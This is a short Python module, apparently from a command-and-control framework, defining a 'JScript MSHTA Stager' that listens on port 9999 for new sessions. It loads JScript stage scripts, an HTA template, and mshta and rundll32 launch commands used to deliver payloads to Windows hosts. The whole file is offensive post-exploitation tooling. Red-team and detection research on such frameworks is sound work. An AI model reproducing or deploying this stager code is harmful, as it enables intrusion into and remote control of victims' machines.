import core.stager
import core.loader

class MSHTAStager(core.stager.StagerWizard):

    NAME = "JScript MSHTA Stager"
    DESCRIPTION = "Listens for new sessions, using JScript MSHTA for payloads"
    AUTHORS = ['zerosum0x0']

    WORKLOAD = "js"

    def load(self):
        #self.options.set("SRVPORT", 9999)
        self.port = 9999

        self.workload = "js"

        self.stdlib = core.loader.load_script('data/stager/js/stdlib.js')
        self.stage = core.loader.load_script('data/stager/js/stage.js')
        self.stagetemplate = core.loader.load_script("data/stager/js/mshta/template.hta")
        self.stagecmd = core.loader.load_script("data/stager/js/mshta/mshta.cmd")
        self.forktemplate = self.stagetemplate
        self.forkcmd = core.loader.load_script("data/stager/js/rundll32/rundll32.cmd")
